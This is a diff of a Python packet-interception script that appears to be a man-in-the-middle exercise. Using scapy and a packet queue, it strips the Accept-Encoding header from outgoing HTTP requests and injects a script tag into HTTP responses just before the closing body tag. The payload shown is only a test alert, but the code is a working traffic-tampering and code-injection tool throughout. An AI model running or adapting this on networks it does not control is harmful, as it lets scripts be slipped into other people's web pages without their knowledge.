@@ -21,21 +21,26 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw):
+        load = scapy_packet[Raw].load
         if scapy_packet.haslayer(TCP):
             if scapy_packet[TCP].dport == 80:
-                print("[+] This is a HTTP Request:  ")
-                modified_load = re.sub(
+                print("[+] HTTP Request:  ")
+                load = re.sub(
                     "Accept-Encoding:.*?\\r\\n",
                     "",
-                    scapy_packet[Raw].load,
+                    load,
                     flags=re.IGNORECASE | re.MULTILINE
                 )
-                new_packet = set_load(scapy_packet, modified_load)
-                packet.set_payload(str(new_packet))
             elif scapy_packet[TCP].sport == 80:
-                modified_load = scapy_packet[Raw].load.replace("</body>", "<script>alert('Test!'); </script></body>")
-                new_packet = set_load(scapy_packet, modified_load)
+                print("[+] HTTP Response:  ")
+                load = load.replace("</body>", "<script>alert('Test!'); </script></body>")
+                new_packet = set_load(scapy_packet, load)
                 packet.set_payload(str(new_packet))
+
+            if load != scapy_packet[Raw].load:
+                new_packet = set_load(scapy_packet, load)
+                packet.set_payload(str(new_packet))
+                
     packet.accept()
 
 if __name__ == "__main__":
